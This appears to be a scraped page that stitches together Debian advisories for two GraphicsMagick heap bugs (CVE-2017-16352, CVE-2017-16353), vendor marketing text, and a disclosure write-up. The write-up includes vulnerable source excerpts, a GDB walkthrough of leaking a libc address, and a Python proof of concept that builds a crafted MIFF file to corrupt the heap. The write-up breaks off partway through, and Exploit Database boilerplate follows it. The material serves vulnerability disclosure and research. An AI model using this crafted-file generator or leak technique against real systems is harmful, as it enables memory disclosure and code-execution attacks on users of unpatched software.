Hash: SHA512

Package        : graphicsmagick
Version        : 1.3.16-1.1+deb7u13
CVE ID         : CVE-2017-16352 CVE-2017-16353

Maor Shwartz, Jeremy Heng and Terry Chia discovered two security
vulnerabilities in Graphicsmagick, a collection of image processing tool
s.

CVE-2017-16352
   Graphicsmagick was vulnerable to a heap-based buffer
   overflow vulnerability found in the "Display visual image directory"
   feature of the DescribeImage() function of the magick/describe.c
   file. One possible  way to trigger the vulnerability is to run the
   identify command on a specially crafted MIFF format file with the
   verbose flag.

CVE-2017-16353
   Graphicsmagick was vulnerable to a memory information disclosure
   vulnerability found in the DescribeImage function of the
   magick/describe.c file, because of a heap-based buffer over-read. The
   portion of the code containing the vulnerability is responsible for
   printing the IPTC Profile information contained in the image. This
   vulnerability can be triggered with a specially crafted MIFF file.
   There is an out-of-bounds buffer dereference because certain
   increments are never checked.

For Debian 7 "Wheezy", these problems have been fixed in version
1.3.16-1.1+deb7u13.

We recommend that you upgrade your graphicsmagick packages.

## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![lightning bolt icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-critical-industries.png)

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.

Various security issues were discovered in Graphicsmagick, a collection
of image processing tools. Heap-based buffer overflows or overreads may
lead to a denial of service or disclosure of in-memory information or
other unspecified impact by processing a malformed image file.

For Debian 8 "Jessie", these problems have been fixed in version
1.3.20-3+deb8u3.

We recommend that you upgrade your graphicsmagick packages.

**Vulnerable App:**

```
'''Vulnerabilities summary
The following advisory describes two (2) vulnerabilities found in GraphicsMagick.

GraphicsMagick is “The swiss army knife of image processing. Comprised of 267K physical lines (according to David A. Wheeler’s SLOCCount) of source code in the base package (or 1,225K including 3rd party libraries) it provides a robust and efficient collection of tools and libraries which support reading, writing, and manipulating an image in over 88 major formats including important formats like DPX, GIF, JPEG, JPEG-2000, PNG, PDF, PNM, and TIFF.”

The vulnerabilities found are:

Memory Information Disclosure
Heap Overflow
Credit
An independent security researchers, Jeremy Heng (@nn_amon) and Terry Chia (Ayrx), has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program

Vendor response
The vendor has released patches to address these vulnerabilities (15237:e4e1c2a581d8 and 15238:7292230dd18).

For more details: ftp://ftp.graphicsmagick.org/pub/GraphicsMagick/snapshots/ChangeLog.txt

Vulnerabilities details

Memory Information Disclosure
GraphicsMagick is vulnerable to a memory information disclosure vulnerability found in DescribeImage function of the magick/describe.c file.

The portion of the code containing the vulnerability responsible of printing the IPTC Profile information contained in the image.

This vulnerability can be triggered with a specially crafted MIFF file.

The code which triggers the vulnerable code path is:

63 MagickExport MagickPassFail DescribeImage(Image *image,FILE *file,
64                                           const MagickBool verbose)
65 {
...
660       for (i=0; i < profile_length; )
661         {
662           if (profile[i] != 0x1c)
663             {
664               i++;
665               continue;
666             }
667           i++;  /* skip file separator */
668           i++;  /* skip record number */
...
725           i++;
726           (void) fprintf(file,"    %.1024s:\n",tag);
727           length=profile[i++] << 8;
728           length|=profile[i++];
729           text=MagickAllocateMemory(char *,length+1);
730           if (text != (char *) NULL)
731             {
732               char
733                 **textlist;
734
735               register unsigned long
736                 j;
737
738               (void) strncpy(text,(char *) profile+i,length);
739               text[length]='\0';
740               textlist=StringToList(text);
741               if (textlist != (char **) NULL)
742                 {
743                   for (j=0; textlist[j] != (char *) NULL; j++)
744                     {
745                       (void) fprintf(file,"  %s\n",textlist[j]);
...
752           i+=length;
753         }

The value in profile_length variable is set in the following field in the MIFF header: profile-iptc=8

There is an out-of-bounds buffer dereference whenever profile[i] is accessed because the increments of i is never checked.

If we break on line 738 of describe.c, we can explore what is present on the heap during the strncpy operation.

gef➤  x/2xg profile
0x8be210:    0x08000a001c414141    0x00007ffff690fba8

The 8 bytes 0x08000a001c414141 is the profile payload present in the specially crafted MIFF file.

41 41 41 - padding
1C - sentinel check in line 662
00 - padding
0A - "Priority" tag
08 00 - 8 in big endian, the length

If we examine the value 0x00007ffff690fba8 adjacent to the payload, it becomes apparent that it is an address within the main_arena struct in libc.

gef➤  x/xw 0x00007ffff690fba8
0x7ffff690fba8 <main_arena+136>:    0x008cdc40

Now we can calculate the offset to libc base – 0x3c4b98

Heap Overflow
GraphicsMagick is vulnerable to a heap overflow vulnerability found in DescribeImage() function of the magick/describe.c file.

The call to strncpy on line 855 does not limit the size to be copied to the size of the buffer copied to. Instead, the size is calculated by searching for a newline or a null byte in the directory name.

844       /*
845         Display visual image directory.
846       */
847       image_info=CloneImageInfo((ImageInfo *) NULL);
848       (void) CloneString(&image_info->size,"64x64");
849       (void) fprintf(file,"  Directory:\n");
850       for (p=image->directory; *p != '\0'; p++)
851         {
852           q=p;
853           while ((*q != '\n') && (*q != '\0'))
854             q++;
855           (void) strncpy(image_info->filename,p,q-p);
856           image_info->filename[q-p]='\0';
857           p=q;
...
880         }
881       DestroyImageInfo(image_info);

Since the field filename in the ImageInfo struct has the static size of 2053, the heap can be corrupted by forging an overly long directory name.

type = struct _ImageInfo {
...
    FILE *file;
    char magick[2053];
    char filename[2053];
    _CacheInfoPtr_ cache;
    void *definitions;
    Image *attributes;
    unsigned int ping;
    PreviewType preview_type;
    unsigned int affirm;
    _BlobInfoPtr_ blob;
    size_t length;
    char unique[2053];
    char zero[2053];
    unsigned long signature;
}

One possible way to trigger the vulnerability is to run the identify command on a specially crafted MIFF format file with the verbose flag.

Proof of Concept
The following proof of concept script will generate a specially crafted MIFF file exploit.miff.
'''

#!/usr/bin/python

from pwn import *

partitions = ('id=ImageMagick  version=1.0\nclass=DirectClass  matte=False\n' +
              'columns=1  rows=1  depth=16\nscene=1\nmontage=1x1+0+0\n\x0c\n' +
              ':\x1a',
              '\n\x00\xbe\xbe\xbe\xbe\xbe\xbe\n')
output = "exploit.miff"

def main():
    payload = "A"*10000
    payload = partitions[0] + payload + partitions[1]
    file(output, "w").write(payload)

if __name__ == "__main__":
    main()

'''
Running the GraphicsMagick gm utility with the arguments identify -verbose in GDB and breaking after the vulnerable strncpy call, and examining the corrupted ImageInfo object demonstrates that the heap corruption was successful.

gef➤  r identify -verbose exploit.miff
...
gef➤  br describe.c:856

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
